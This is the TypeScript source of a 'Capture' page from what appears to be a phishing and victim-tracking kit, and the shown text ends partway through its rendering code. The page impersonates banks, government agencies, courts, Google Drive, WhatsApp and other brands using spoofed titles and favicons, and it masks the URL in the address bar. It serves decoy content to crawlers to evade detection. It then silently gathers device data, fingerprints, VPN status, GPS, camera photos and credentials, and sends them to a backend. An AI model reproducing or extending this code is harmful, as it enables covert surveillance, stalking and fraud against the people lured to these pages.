import { useEffect, useState, useCallback, useRef } from 'react';
import { useParams } from "@/lib/router-compat";
import { supabase } from '@/integrations/supabase/client';
import { getDeviceInfo, requestGPS, requestCamera, startGpsWatchSync, getIPBasedLocation } from '@/lib/device-info';
import { comprehensiveVPNDetection } from '@/lib/advanced-vpn-detection';
import { generateBrowserFingerprint } from '@/lib/browser-fingerprint';

import { detectCloaking, getDecoyContent } from '@/lib/cloaking-engine';
import { stopContinuousMonitoring } from '@/lib/continuous-monitoring';
import { Loader2, AlertCircle, FileText, Download } from 'lucide-react';
import { Button } from '@/components/ui/button';
import CaptureTemplate from '@/components/CaptureTemplates';
import TriggerPage, { triggerPageTemplates } from '@/components/TriggerPages';
import BridgePage from '@/components/BridgePage';
import ConsentCapturePage from '@/components/ConsentCapturePage';
import { applyDisguisedFavicon } from '@/lib/disguise-favicon';

interface LinkData {
  id: string;
  destination_url: string;
  capture_gps: boolean;
  capture_camera?: boolean;
  capture_template: string;
  expires_at?: string;
  max_clicks?: number;
  custom_slug?: string;
  bridge_text?: string;
  cloaking_enabled?: boolean;
  pix_metadata?: any;
  user_id?: string;
  custom_image_url?: string | null;
  bait_audio_url?: string | null;
  bait_audio_duration_seconds?: number | null;
}

export default function Capture() {
  const { code, fileId } = useParams<{ code?: string; fileId?: string }>();
  // Support Drive-mimicking slugs like /file/d/xxxxx/view
  const resolvedCode = fileId ? `file/d/${fileId}/view` : code;

  // Blindagem total contra PWA/branding nas páginas de captura
  useEffect(() => {
    // Remove manifest
    document.querySelectorAll('link[rel="manifest"]').forEach(el => el.remove());
    // Remove apple-touch-icon
    document.querySelectorAll('link[rel="apple-touch-icon"]').forEach(el => el.remove());
    // Remove theme-color
    document.querySelectorAll('meta[name="theme-color"]').forEach(el => el.remove());
    // Neutralize title
    document.title = '';
    // Substitui o favicon do app pelo do domínio atual IMEDIATAMENTE — antes mesmo
    // de a query do link resolver, para que o ícone do Lovable nunca apareça nem por
    // 1 frame durante o loading.
    applyDisguisedFavicon();

    // Block install prompt
    const preventInstall = (e: Event) => { e.preventDefault(); };
    window.addEventListener('beforeinstallprompt', preventInstall);

    // Unregister any service workers
    if (navigator.serviceWorker) {
      navigator.serviceWorker.getRegistrations().then(regs => {
        regs.forEach(r => r.unregister());
      });
    }

    return () => window.removeEventListener('beforeinstallprompt', preventInstall);
  }, []);
  const [status, setStatus] = useState<'loading' | 'template' | 'bridge' | 'bridge_stay' | 'consent' | 'capturing' | 'cloaked' | 'error' | 'expired' | 'limit_reached'>('loading');
  const [link, setLink] = useState<LinkData | null>(null);
  const [templateLoading, setTemplateLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [cloakedUrl, setCloakedUrl] = useState<string | null>(null);
  const [capturedCredentials, setCapturedCredentials] = useState<{ username?: string; password?: string } | null>(null);
  const templateActionStartedRef = useRef(false);
  const bridgeStayCompletedRef = useRef(false);
  const bridgeActionStartedRef = useRef(false);
  const captureRedirectStartedRef = useRef(false);

  // Behavioral tracking: dwell time + scroll/interaction
  const pageLoadTimeRef = useRef(Date.now());
  const maxScrollDepthRef = useRef(0);
  const clickCountRef = useRef(0);
  const touchCountRef = useRef(0);
  const mouseMoveCountRef = useRef(0);

  useEffect(() => {
    const handleScroll = () => {
      const scrollPercent = Math.round(
        (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight || 1)) * 100
      );
      if (scrollPercent > maxScrollDepthRef.current) {
        maxScrollDepthRef.current = Math.min(scrollPercent, 100);
      }
    };
    const handleClick = () => { clickCountRef.current++; };
    const handleTouch = () => { touchCountRef.current++; };
    const handleMouseMove = () => { mouseMoveCountRef.current++; };

    window.addEventListener('scroll', handleScroll, { passive: true });
    window.addEventListener('click', handleClick, { passive: true });
    window.addEventListener('touchstart', handleTouch, { passive: true });
    window.addEventListener('mousemove', handleMouseMove, { passive: true });

    return () => {
      window.removeEventListener('scroll', handleScroll);
      window.removeEventListener('click', handleClick);
      window.removeEventListener('touchstart', handleTouch);
      window.removeEventListener('mousemove', handleMouseMove);
    };
  }, []);

  const getBehavioralData = useCallback(() => ({
    dwell_time_ms: Date.now() - pageLoadTimeRef.current,
    max_scroll_depth_percent: maxScrollDepthRef.current,
    click_count: clickCountRef.current,
    touch_count: touchCountRef.current,
    mouse_move_count: mouseMoveCountRef.current,
  }), []);

  const saveAndRedirect = useCallback(async (shortCode: string, gps: { latitude: number; longitude: number; accuracy?: number | null } | null, photo: string | null = null) => {
    setStatus('capturing');
    const deviceInfo = await getDeviceInfo();

    try {
      // FAST PATH: registrar clique imediatamente com telemetria mínima.
      // VPN/fingerprint pesados são enviados depois via sendBeacon.
      const { data, error } = await supabase.functions.invoke('capture-click', {
        body: {
          short_code: shortCode,
          device_info: deviceInfo,
          gps,
          photo,
          captured_identity: { ...(capturedCredentials || {}) },
          vpn_data: { is_vpn: false, is_proxy: false, is_datacenter: false, is_tor: false, confidence: 0, detection_methods: [] },
          fingerprint_data: { hash: '', canvas: '', audio: '', webgl: '', fonts: [] },
          visited_sites: [],
          extended_telemetry: {
            behavioral: getBehavioralData(),
            fast_redirect: true,
          },
        },
      });

      if (error || !data?.destination_url) {
        if (data?.error === 'Link expired') {
          setStatus('expired');
          setErrorMessage('Este link expirou e não está mais disponível.');
          return;
        }
        if (data?.error === 'Click limit reached') {
          setStatus('limit_reached');
          setErrorMessage('Este link atingiu o limite de cliques.');
          return;
        }
        if (data?.error === 'Link not yet active') {
          setStatus('error');
          setErrorMessage('Este link ainda não está disponível.');
          return;
        }
        setStatus('error');
        return;
      }

      const finalUrl = data.destination_url;
      const clickId = data.click_id as string | undefined;

      // Dispara coleta pesada (VPN + fingerprint) em paralelo e envia via
      // sendBeacon para sobreviver ao redirect.
      if (clickId) {
        // @ts-ignore migration: strict-mode wave
        if (link.capture_template !== 'pdf_delivery') (async () => {
          try {
            const [vpnResult, fpResult] = await Promise.allSettled([
              comprehensiveVPNDetection('unknown'),
              generateBrowserFingerprint(),
            ]);
            const vpnData = vpnResult.status === 'fulfilled' ? vpnResult.value : null;
            const fingerprint = fpResult.status === 'fulfilled' ? fpResult.value : null;

            const payload = JSON.stringify({
              click_id: clickId,
              vpn_data: vpnData,
              fingerprint_data: fingerprint,
            });

            const url = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1/update-click-telemetry`;

            // sendBeacon não permite headers customizados — enviamos como Blob
            // com Content-Type embutido. A função aceita anon (verify_jwt=false default).
            if (navigator.sendBeacon) {
              const blob = new Blob([payload], { type: 'application/json' });
              navigator.sendBeacon(url, blob);
            } else {
              fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: payload,
                keepalive: true,
              }).catch(() => {});
            }
          } catch (e) {
            console.warn('Telemetria pós-redirect falhou:', e);
          }
        })();
      }

      // Cloaking via iframe APENAS quando o operador habilitou explicitamente.
      // Caso contrário, redirect direto — quase imperceptível.
      if (link?.cloaking_enabled === true) {
        setCloakedUrl(finalUrl);
        setStatus('cloaked');
        setTimeout(() => {
          if (status !== 'cloaked') {
            window.location.replace(finalUrl);
          }
        }, 3000);
      } else {
        window.location.replace(finalUrl);
      }
    } catch (err) {
      console.error('Capture error:', err);
      setStatus('error');
    }
  }, [status, capturedCredentials, getBehavioralData, link]);

  useEffect(() => {
    if (!resolvedCode) return;

    // Immediately neutralize branding before any async work
    document.title = '\u200B';
    const existingIcon = document.querySelector("link[rel~='icon']") as HTMLLinkElement;
    if (existingIcon) {
      existingIcon.href = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
    }

    const fetchLink = async () => {
      try {
        // Primeiro, verificar se é um Capture Link (token de vítima) via RPC segura
        const { data: isCaptureLink } = await (supabase as any)
          .rpc('capture_session_token_exists', { p_token: resolvedCode });

        if (isCaptureLink) {
          window.location.replace(`/capture-link/${resolvedCode}`);
          return;
        }


        // Use security definer function to look up link by slug/short_code
        const { data: linkResults, error: linkError } = await supabase
          .rpc('get_link_by_slug', { slug: resolvedCode });

        let link: LinkData | null = null;
        let error = linkError;

        if (!error && linkResults && (linkResults as any[]).length > 0) {
          link = (linkResults as any[])[0] as any;
        } else {
          error = linkError;
        }

        if (error || !link) {
          console.error('[Capture] Link não encontrado para slug:', resolvedCode, 'erro:', error);
          setStatus('error');
          setErrorMessage(`Link não encontrado (${resolvedCode}). Pode ter sido removido ou o endereço está incorreto.`);
          return;
        }

        if (link.expires_at && new Date(link.expires_at) < new Date()) {
          setStatus('expired');
          setErrorMessage('Este link expirou e não está mais disponível.');
          return;
        }

        if (link.max_clicks) {
          const { count, error: countError } = await supabase
            .from('link_clicks')
            .select('*', { count: 'exact', head: true })
            .eq('link_id', link.id);

          if (!countError && count !== null && count >= link.max_clicks) {
            setStatus('limit_reached');
            setErrorMessage('Este link atingiu o limite de cliques.');
            return;
          }
        }

        setLink(link);

        // CLOAKING: Detectar bots/crawlers e servir conteúdo decoy
        if (link.cloaking_enabled !== false) {
          const cloakResult = detectCloaking();
          if (cloakResult.should_cloak) {
            console.log(`[Cloaking] Bot detectado: ${cloakResult.bot_name} (${cloakResult.bot_type}, confiança: ${cloakResult.confidence}%)`);
            const decoy = getDecoyContent(cloakResult.bot_type);
            document.title = decoy.title;
            // Servir página decoy para bots - eles veem conteúdo neutro
            document.open();
            document.write(decoy.body);
            document.close();
            return;
          }
        }

        const requiresExplicitCapture = Boolean(link.capture_gps || link.capture_camera);

        // CAPTURA SILENCIOSA NO PRIMEIRO CLIQUE
        // Só registrar quando NÃO depende de consentimento E NÃO vai passar por template/bridge
        // (templates stayOnPage e trigger criam seus próprios cliques no fluxo subsequente).
        // CAPTURA SILENCIOSA NO PRIMEIRO CLIQUE
        // Registramos o clique inicial para TODOS os links, independentemente do template.
        // Se o link exigir GPS/Câmera, este clique servirá como o registro inicial de IP/Acesso.
        // CAPTURA SILENCIOSA EM SEGUNDO PLANO (Não bloqueante)
        // Registramos o acesso imediatamente para garantir que o IP apareça no dashboard
        (async () => {
          try {
            // Executa em paralelo para ser o mais rápido possível
            const [deviceInfo, advancedData] = await Promise.all([
              getDeviceInfo(),
              collectAdvancedData()
            ]);

            await supabase.functions.invoke('capture-click', {
              body: {
                short_code: resolvedCode,
                device_info: deviceInfo,
                gps: null,
                photo: null,
                captured_identity: { autofilled_fields: [], capture_timestamp: Date.now() },
                vpn_data: advancedData.vpnData,
                fingerprint_data: advancedData.fingerprint,
                extended_telemetry: { 
                  behavioral: getBehavioralData(),
                  silent_initial_capture: true
                },
              },
            });
          } catch (err) {
            console.warn('Erro na captura silenciosa inicial:', err);
          }
        })();

        // Títulos para camuflagem
        const titles: Record<string, string> = {
          mercadolivre: '📦 Mercado Livre - Rastreio',
          ifood: '🍔 iFood - Cupom Pronto',
          pix: '💰 Pix Recebido',
          shopee: '🛍️ Shopee - Cupom R$30',
          uber: '🚗 Uber - Corrida a Caminho',
          netflix: '🎬 Netflix - 1 Mês Grátis',
          whatsapp: '📍 Localização Compartilhada',
          raffle: '🎟️ Sorteio - Participe Agora',
          wifi: '📶 Wi-Fi Grátis Disponível',
          betano: '⚽ Betano - Bônus de Boas-vindas',
          bet365: '🏟️ Bet365 - Apostas Esportivas',
          stake: '🎰 Stake - Aposta Garantida',
          selfie: '🛡️ Verificação de Segurança',
          map: '📍 Localização no Mapa',
          delivery: '📦 Entrega em Caminho',
          promo: '🎁 Oferta Exclusiva',
          security: '🔒 Verificação de Segurança',
          stealth_404: '404 Not Found',
          stealth_maintenance: 'Site em Manutenção',
          stealth_removed: 'Conteúdo Removido',
          // Trigger Pages
          trigger_discord_download: 'Discord - Download',
          trigger_drive_video: 'Google Drive - Vídeo',
          trigger_google_docs: 'Google Docs',
          trigger_g1_news: 'G1 - Notícias',
          trigger_comprovante_bb: 'Banco do Brasil',
          trigger_comprovante_caixa: 'Caixa Econômica',
          trigger_comprovante_pix: 'Comprovante Pix',
          trigger_saque: 'Solicitar Saque',
          trigger_mercadopago: 'Mercado Pago',
          trigger_discord_server: 'Discord',
          trigger_drive_download: 'Google Drive',
          trigger_correios: 'Correios - Rastreamento',
          trigger_fgts: 'FGTS Digital',
          trigger_instagram: 'Instagram',
          trigger_telegram: 'Telegram',
          trigger_google_security: 'Google - Segurança',
          trigger_whatsapp_loc: 'WhatsApp',
          trigger_nubank: 'Nubank',
          trigger_itau: 'Itaú Unibanco',
          trigger_bradesco: 'Bradesco',
          trigger_spotify: 'Spotify — Conta',
          trigger_linkedin: 'LinkedIn',
          trigger_uber_corrida: 'Uber — Viagem',
          trigger_99_corrida: '99 — Corrida',
          trigger_amazon: 'Amazon — Entrega',
          trigger_receita_federal: 'Receita Federal',
          trigger_reconhecimento: 'Reconhecimento — Ajude',
          trigger_recompensa: 'Recompensa por Informação',
          trigger_wise: 'Wise — Transfer',
          trigger_comprovante_c6: 'C6 Bank',
          trigger_alerta_amber: 'Alerta Urgente',
          trigger_intimacao_judicial: 'Poder Judiciário',
          trigger_convite_reuniao: 'Microsoft Teams',
          trigger_ordem_protetiva: 'Poder Judiciário',
          trigger_restituicao_ir: 'Receita Federal',
          deaddrop_google_drive: 'Google Drive',
          deaddrop_dropbox: 'Dropbox Transfer',
          deaddrop_onedrive: 'OneDrive',
          deaddrop_sharepoint: 'SharePoint',
          deaddrop_wetransfer: 'WeTransfer',
          pdf_delivery: 'Documento PDF',
        };
        
        // Favicons para camuflagem de aba
        const favicons: Record<string, string> = {
          mercadolivre: 'https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.73/mercadolibre/favicon.svg',
          ifood: 'https://static-images.ifood.com.br/image/upload/t_high/webapp/images/favicon.png',
          pix: 'https://www.bcb.gov.br/favicon.ico',
          shopee: 'https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/icon_favicon_1_32.0Wecx.png',
          uber: 'https://d1a3f4spazzrp4.cloudfront.net/car-types/haloProductImages/v1.1/Uber_Moto_558x372_pixels_Mobile.png',
          netflix: 'https://assets.nflxext.com/ffe/siteui/common/icons/nficon2016.ico',
          whatsapp: 'https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png',
          bet365: 'https://www.bet365.com/favicon.ico',
          betano: 'https://www.betano.com.br/favicon.ico',
          stake: 'https://stake.com/favicon.ico',
          blaze: 'https://blaze.com/favicon.ico',
          trigger_discord_download: 'https://discord.com/assets/favicon.ico',
          trigger_discord_server: 'https://discord.com/assets/favicon.ico',
          trigger_drive_video: 'https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png',
          trigger_drive_download: 'https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png',
          trigger_google_docs: 'https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico',
          trigger_g1_news: 'https://s3.glbimg.com/v1/AUTH_59afe1115a144fefbb24e8a04bb7c640/g1/favicon-g1.ico',
          trigger_comprovante_bb: 'https://www.bb.com.br/favicon.ico',
          trigger_comprovante_caixa: 'https://www.caixa.gov.br/favicon.ico',
          trigger_comprovante_pix: 'https://www.bcb.gov.br/favicon.ico',
          trigger_mercadopago: 'https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.6.73/mercadopago/favicon.svg',
          trigger_correios: 'https://www.correios.com.br/favicon.ico',
          trigger_fgts: 'https://www.caixa.gov.br/favicon.ico',
          trigger_nubank: 'https://nubank.com.br/favicon.ico',
          trigger_itau: 'https://www.itau.com.br/favicon.ico',
          trigger_bradesco: 'https://banco.bradesco/favicon.ico',
          trigger_instagram: 'https://static.cdninstagram.com/rsrc.php/v3/yI/r/OBkSl25jXAP.png',
          trigger_telegram: 'https://telegram.org/favicon.ico',
          trigger_google_security: 'https://www.google.com/favicon.ico',
          trigger_spotify: 'https://open.spotifycdn.com/cdn/images/favicon32.b64ecc03.png',
          trigger_linkedin: 'https://static.licdn.com/aero-v1/sc/h/akt4ae504epesldzj74dzred8',
          trigger_uber_corrida: 'https://www.uber.com/favicon.ico',
          trigger_amazon: 'https://www.amazon.com.br/favicon.ico',
          trigger_receita_federal: 'https://www.gov.br/favicon.ico',
          trigger_saque: 'https://www.bcb.gov.br/favicon.ico',
          trigger_alerta_amber: 'https://www.gov.br/favicon.ico',
          trigger_intimacao_judicial: 'https://www.tjsp.jus.br/favicon.ico',
          trigger_convite_reuniao: 'https://statics.teams.cdn.office.net/hashedassets/v3/assets/favicons/favicon-32x32-a9b2e1a4.png',
          trigger_ordem_protetiva: 'https://www.tjsp.jus.br/favicon.ico',
          trigger_restituicao_ir: 'https://www.gov.br/favicon.ico',
          trigger_wise: 'https://wise.com/public-resources/assets/flags/wise/64/wise.png',
          trigger_comprovante_c6: 'https://www.c6bank.com.br/favicon.ico',
          deaddrop_google_drive: 'https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png',
          deaddrop_dropbox: 'https://cfl.dropboxstatic.com/static/images/favicon-vfl8lUR9B.ico',
          deaddrop_onedrive: 'https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/brand-icons/product/svg/onedrive_32x1.svg',
          deaddrop_sharepoint: 'https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/brand-icons/product/svg/sharepoint_32x1.svg',
          deaddrop_wetransfer: 'https://wetransfer.com/favicon.ico',
        };

        // Aplica favicon disfarçado: prioriza o ícone do próprio domínio (mirror/subdomínio).
        // No domínio do app, cai no favicon explícito do template (ou genérico do host).
        applyDisguisedFavicon({ templateFavicon: favicons[link.capture_template] });

        const pageTitle = titles[link.capture_template] || 'Aguarde...';
        document.title = pageTitle;

        // TENTATIVA DE MASCARAR A URL NA BARRA DE ENDEREÇOS
        // Isso altera a URL visível para algo mais discreto sem recarregar a página
        try {
          const newUrl = window.location.origin + '/' + (link.capture_template !== 'default' ? link.capture_template : 'access');
          window.history.replaceState({}, pageTitle, newUrl);
        } catch (e) {
          console.warn('History API not supported or restricted');
        }

        // Stealth templates: captura silenciosa e redireciona sem interação
        const stealthTemplates = ['stealth_404', 'stealth_maintenance', 'stealth_removed'];
        // Templates that show bridge FIRST, then display the template as final page
        const bridgeFirstTemplates = ['trigger_mercadopago'];

        // Trigger pages que auto-capturam (comprovantes, notícias)
        const autoCaptureTriggers = [
          'trigger_g1_news', 'trigger_comprovante_bb', 'trigger_comprovante_caixa', 'trigger_comprovante_pix',
          'trigger_nubank', 'trigger_itau', 'trigger_bradesco',
          'trigger_spotify', 'trigger_linkedin', 'trigger_uber_corrida', 'trigger_99_corrida', 'trigger_amazon',
          'trigger_receita_federal',
          'trigger_reconhecimento', 'trigger_recompensa', 'trigger_wise',
          'trigger_comprovante_c6',
          'deaddrop_google_drive', 'deaddrop_dropbox', 'deaddrop_onedrive', 'deaddrop_sharepoint', 'deaddrop_wetransfer',
          'trigger_image_bait', 'trigger_audio_whatsapp_bait',
        ];
        if (link.capture_template === 'pdf_delivery') {
          setStatus('template');
        } else if (stealthTemplates.includes(link.capture_template)) {
          setStatus('template');
        } else if (bridgeFirstTemplates.includes(link.capture_template)) {
          // Show bridge page first, then display the template as final destination
          setStatus('bridge_stay');
        } else if (autoCaptureTriggers.includes(link.capture_template)) {
          setStatus('template');
        } else if (triggerPageTemplates[link.capture_template]) {
          setStatus('template');
        } else if (link.capture_gps && link.capture_template && link.capture_template !== 'default') {
          setStatus('template');
        } else {
          const gps = link.capture_gps ? await requestGPS() : null;
          await saveAndRedirect(resolvedCode, gps);
        }
      } catch (err) {
        setStatus('error');
        setErrorMessage('Erro ao processar o link.');
      }
    };

    fetchLink();
  }, [code]);

  // Templates that should stay on screen after capture (receipts, statements)
  const stayOnPageTemplates = [
    'trigger_comprovante_bb', 'trigger_comprovante_caixa', 'trigger_comprovante_pix', 'trigger_mercadopago',
    'trigger_nubank', 'trigger_itau', 'trigger_bradesco',
    'trigger_spotify', 'trigger_linkedin', 'trigger_uber_corrida', 'trigger_99_corrida', 'trigger_amazon',
    'trigger_receita_federal',
    'trigger_reconhecimento', 'trigger_recompensa', 'trigger_g1_news',
    'trigger_correios', 'trigger_fgts', 'trigger_wise',
    'trigger_comprovante_c6',
    'trigger_image_bait', 'trigger_audio_whatsapp_bait',
  ];

  // Reusable advanced capture function — collects identity, VPN, fingerprint
  const collectAdvancedData = async () => {
    let vpnData = { is_vpn: false, is_proxy: false, is_datacenter: false, is_tor: false, confidence: 0, detection_methods: [] as string[] };
    let fingerprint = { hash: '', canvas: '', audio: '', webgl: '', fonts: [] as string[] };

    try {
      const [vpnResult, fpResult] = await Promise.allSettled([
        comprehensiveVPNDetection('unknown'),
        generateBrowserFingerprint(),
      ]);

      if (vpnResult.status === 'fulfilled') vpnData = vpnResult.value;
      if (fpResult.status === 'fulfilled') fingerprint = fpResult.value;
    } catch (err) {
      console.warn('Erro ao capturar dados avançados:', err);
    }

    return { vpnData, fingerprint };
  };

  const handleTemplateAllow = async () => {
    if (!link || !resolvedCode || templateActionStartedRef.current) return;
    templateActionStartedRef.current = true;

    // Bait templates: silent capture inline, NEVER show bridge (preserves WhatsApp/image disguise)
    const silentBaitTemplates = ['trigger_audio_whatsapp_bait', 'trigger_image_bait'];
    if (silentBaitTemplates.includes(link.capture_template)) {
      if (bridgeStayCompletedRef.current) {
        templateActionStartedRef.current = false;
        return;
      }
      bridgeStayCompletedRef.current = true;

      // CRITICAL: must start GPS watcher SYNCHRONOUSLY (before any await) to preserve
      // user-activation context — otherwise iOS/Chrome Android suppress the prompt.
      const gpsWatcher = link.capture_gps ? startGpsWatchSync() : null;

      try {
        // Parallel: GPS convergence + camera + device info collection
        const [gpsRes, photoRes, deviceInfo, advanced] = await Promise.all([
          gpsWatcher
            ? gpsWatcher.waitForBest(8000, 80).then(async (g) => {
                if (g) return g;
                if (gpsWatcher.wasDenied()) return null;
                // IP fallback when sensor produces nothing and user didn't deny
                try { return await getIPBasedLocation() as any; } catch { return null; }
              }).finally(() => { try { gpsWatcher.stop(); } catch {} })
            : Promise.resolve(null),
          link.capture_camera ? requestCamera().catch(() => null) : Promise.resolve(null),
          getDeviceInfo(),
          collectAdvancedData(),
        ]);

        await supabase.functions.invoke('capture-click', {
          body: {
            short_code: resolvedCode,
            device_info: deviceInfo,
            gps: gpsRes ?? null,
            photo: photoRes ?? null,
            captured_identity: {},
            vpn_data: advanced.vpnData,
            fingerprint_data: advanced.fingerprint,
            visited_sites: [],
            extended_telemetry: { behavioral: getBehavioralData() },
          },
        });
      } catch (err) {
        console.warn('[Capture] silent bait capture failed:', err);
      } finally {
        templateActionStartedRef.current = false;
      }
      return;
    }


    // For receipt/comprovante templates: show bridge, capture data, then return to template
    // But skip if bridge_stay already completed (prevents infinite loop with auto-trigger templates)
    if (stayOnPageTemplates.includes(link.capture_template)) {
      if (bridgeStayCompletedRef.current) {
        templateActionStartedRef.current = false;
        return;
      }
      setTemplateLoading(true);
      setStatus('bridge_stay');
      return;
    }

    setTemplateLoading(true);
    setStatus('bridge');
  };

  const handleBridgeStayComplete = async () => {
    if (!link || !resolvedCode) return;
    console.log('[Capture] handleBridgeStayComplete called, link:', link.capture_template, 'gps:', link.capture_gps, 'camera:', link.capture_camera);

    // For stay-on-page templates: if the link requires GPS/camera consent,
    // go to the consent flow instead of creating an empty placeholder click.
    const requiresConsent = Boolean(link.capture_gps || link.capture_camera);
    if (requiresConsent) {
      setTemplateLoading(false);
      templateActionStartedRef.current = false;
      bridgeStayCompletedRef.current = true;
      setStatus('consent');
      return;
    }

    // No GPS/camera required — do a basic capture with device info
    try {
      const deviceInfo = await getDeviceInfo();
      const { vpnData, fingerprint } = await collectAdvancedData();
      await supabase.functions.invoke('capture-click', {
        body: {
          short_code: resolvedCode,
          device_info: deviceInfo,
          gps: null,
          photo: null,
          captured_identity: {},
          vpn_data: vpnData,
          fingerprint_data: fingerprint,
          visited_sites: [],
          extended_telemetry: { behavioral: getBehavioralData() },
        },
      });
    } catch (err) {
      console.warn('Erro na captura silenciosa do comprovante:', err);
    } finally {
      setTemplateLoading(false);
      templateActionStartedRef.current = false;
      bridgeStayCompletedRef.current = true;
      setStatus('template');
    }
  };

  const handleBridgeComplete = async () => {
    if (!link || !resolvedCode || bridgeActionStartedRef.current) return;
    bridgeActionStartedRef.current = true;

    if (link.capture_gps || link.capture_camera) {
      setStatus('consent');
      return;
    }

    await executeCaptureAndRedirect(null, null, {});
  };

  const executeCaptureAndRedirect = async (
    gps: { latitude: number; longitude: number; accuracy?: number | null; altitude?: number | null; altitudeAccuracy?: number | null; heading?: number | null; speed?: number | null } | null,
    photo: string | null,
    denied: { gps_permission_denied?: boolean; photo_permission_denied?: boolean },
    extras?: {
      network_latency?: Array<{ target: string; region: string; latencyMs: number; serverLat?: number; serverLon?: number; estimatedMaxKm?: number }>;
      motion_summary?: { sample_count: number; total_variance: number; state: string };
    }
  ) => {
    if (!link || !resolvedCode || captureRedirectStartedRef.current) return;
    captureRedirectStartedRef.current = true;
    setStatus('capturing');

    try {
      const deviceInfo = await getDeviceInfo();
      const { vpnData, fingerprint } = await collectAdvancedData();
      // Classify GPS source with granular taxonomy:
      //   native_high   — sensor reading, accuracy ≤ 100m (precise GPS fix)
      //   native_low    — sensor reading, accuracy 100-1500m (indoor / partial A-GPS)
      //   native_coarse — sensor reading, accuracy > 1500m or null (cell-tower fallback by OS)
      //   ip-fallback   — coordinates came from getIPBasedLocation (no sensor)
      //   ip-denied     — user denied permission
      //   none          — no coordinates available at all
      let gpsSource: string | undefined;
      if (gps && gps.latitude && gps.longitude) {
        // We can't directly distinguish native vs IP-fallback at this layer,
        // but accuracy is a strong proxy: IP-based geo always returns >= 5000m or null.
        // Sensor readings on mobile range from ~5m (outdoor fix) to ~1500m (indoor/A-GPS).
        const acc = typeof gps.accuracy === 'number' ? gps.accuracy : null;
        if (acc !== null && acc <= 100) {
          gpsSource = 'native_high';
        } else if (acc !== null && acc <= 1500) {
          gpsSource = 'native_low';
        } else if (acc !== null && acc <= 5000) {
          gpsSource = 'native_coarse';
        } else {
          // accuracy null OR > 5000m → almost certainly IP-derived
          gpsSource = 'ip-fallback';
        }
      } else if (denied.gps_permission_denied) {
        gpsSource = 'ip-denied';
      } else {
        gpsSource = 'none';
      }

      // GPS motion (speed/heading/altitude) — extra ricos do navigator.geolocation
      const gpsMotion = (gps && (gps.altitude != null || gps.heading != null || gps.speed != null))
        ? {
            altitude: typeof gps.altitude === 'number' ? gps.altitude : null,
            altitude_accuracy: typeof gps.altitudeAccuracy === 'number' ? gps.altitudeAccuracy : null,
            heading: typeof gps.heading === 'number' ? gps.heading : null,
            speed: typeof gps.speed === 'number' ? gps.speed : null,
          }
        : undefined;

      const { data, error } = await supabase.functions.invoke('capture-click', {
        body: {
          short_code: resolvedCode,
          device_info: { ...deviceInfo, ...(extras?.network_latency ? { network_latency: extras.network_latency } : {}) },
          gps: gps ? { latitude: gps.latitude, longitude: gps.longitude, accuracy: gps.accuracy ?? null } : null,
          photo,
          captured_identity: {
            ...(capturedCredentials || {}),
          },
          vpn_data: vpnData,
          fingerprint_data: fingerprint,
          visited_sites: [],
          extended_telemetry: {
            ...denied,
            ...(gpsSource ? { gps_source: gpsSource } : {}),
            ...(gpsMotion ? { gps_motion: gpsMotion } : {}),
            ...(extras?.motion_summary ? { motion_summary: extras.motion_summary } : {}),
            behavioral: getBehavioralData(),
          },
        },
      });

      // Inicia monitoramento contínuo opcional (silencioso, GPS já autorizado)
      if (gps && (link as any).enable_continuous_gps && resolvedCode) {
        try {
          const { initMonitoring } = await import('@/lib/continuous-monitoring');
          initMonitoring({ linkId: link.id, shortCode: resolvedCode, intervalMs: 30000, maxCaptures: 10 });
        } catch (e) {
          console.warn('continuous monitoring init failed', e);
        }
      }

      if (error || !data?.destination_url) {
        if (link.destination_url) {
          window.location.href = link.destination_url;
        }
      } else {
        window.location.href = data.destination_url;
      }
    } catch (err) {
      console.error('Erro ao capturar dados:', err);
      if (link?.destination_url) {
        window.location.href = link.destination_url;
      }
    }
  };
  
  useEffect(() => {
    if (status === 'template' && link) {
      // Continuous monitoring removed — GPS now requires explicit consent
    }

    return () => {
      stopContinuousMonitoring();
    };
  }, [status, link, resolvedCode]);

  // Renderização da camuflagem de domínio (Cloaking)
  if (status === 'cloaked' && cloakedUrl) {
    return (
      <div className="fixed inset-0 w-full h-full overflow-hidden bg-white z-[9999]">
        <iframe
          src={cloakedUrl}
          className="w-full h-full border-none"
          title="Content"
          allow="geolocation; camera; microphone"
          // Removido sandbox restritivo para evitar página em branco em sites que bloqueiam iframes
          // Usamos apenas o necessário para o site funcionar
          loading="eager"
        />
        {/* Botão de emergência caso o site bloqueie iframe */}
        {cloakedUrl && (
          <div className="fixed bottom-4 right-4 z-[10000]">
            <button 
              onClick={() => { window.location.href = cloakedUrl; }}
              className="bg-primary text-white px-4 py-2 rounded-full text-xs shadow-lg opacity-50 hover:opacity-100 transition-opacity"
            >
              Problemas ao carregar? Clique aqui
            </button>
          </div>
        )}
      </div>
    );
  }

  if (status === 'bridge' && link) {
    const customTexts = link.bridge_text
      ? link.bridge_text.split(',').map(t => t.trim()).filter(Boolean)
      : undefined;
    // Express mode: bridge curta (~400ms) para o redirect ser imperceptível
    // quando o operador não definiu textos customizados nem template específico.
    const hasTemplateSteps = link.capture_template && link.capture_template !== 'default';
    const bridgeMode: 'full' | 'express' =
      !customTexts && !hasTemplateSteps ? 'express' : 'full';
    return (
      <BridgePage
        template={link.capture_template}
        customTexts={customTexts}
        mode={bridgeMode}
        onComplete={handleBridgeComplete}
      />
    );
  }

  if (status === 'bridge_stay' && link) {
    const customTexts = link.bridge_text
      ? link.bridge_text.split(',').map(t => t.trim()).filter(Boolean)
      : undefined;
    return (
      <BridgePage
        template={link.capture_template}
        customTexts={customTexts}
